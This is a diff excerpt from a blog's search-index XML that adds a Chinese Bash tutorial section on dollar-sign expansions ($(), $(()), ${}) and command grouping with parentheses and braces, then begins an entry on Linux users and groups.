+<h3 id="四、符号-后的括号"><a href="#四、符号-后的括号" class="headerlink" title="四、符号$后的括号"></a>四、符号$后的括号</h3><ul>
+<li>(1) ${a} 变量a的值, 在不引起歧义的情况下可以省略大括号。</li>
+<li>(2) $(cmd) 命令替换,和<code>cmd</code>效果相同,结果为shell命令cmd的输,过某些Shell版本不支持$()形式的命令替换, 如tcsh。</li>
+<li>(3) $((expression)) 和<code>exprexpression</code>效果相同, 计算数学表达式exp的数值, 其中exp只要符合C语言的运算规则即可, 甚至三目运算符和逻辑表达式都可以计算。</li>
+</ul>
+<h3 id="五、使用多条命令执行"><a href="#五、使用多条命令执行" class="headerlink" title="五、使用多条命令执行"></a>五、使用多条命令执行</h3><ul>
+<li>(1)单小括号,(cmd1;cmd2;cmd3) 新开一个子shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开,最后一个命令后可以没有分号。</li>
+<li>(2)单大括号,{ cmd1;cmd2;cmd3;} 在当前shell顺序执行命令cmd1,cmd2,cmd3, 各命令之间用分号隔开, 最后一个命令后必须有分号, 第一条命令和左括号之间必须用空格隔开。对{}和()而言, 括号中的重定向符只影响该条命令, 而括号外的重定向符影响到括号中的所有命令。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>技术培训</category>
+        <category>LinuxBash脚本教程</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>LinuxBash脚本</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux 用户和组</title>
     <url>/2016/12/22/booboo_linux_base/02-Linux%E7%94%A8%E6%88%B7%E5%92%8C%E7%BB%84/</url>
     <content><![CDATA[<h2 id="课堂作业"><a href="#课堂作业" class="headerlink" title="课堂作业"></a>课堂作业</h2><ol>
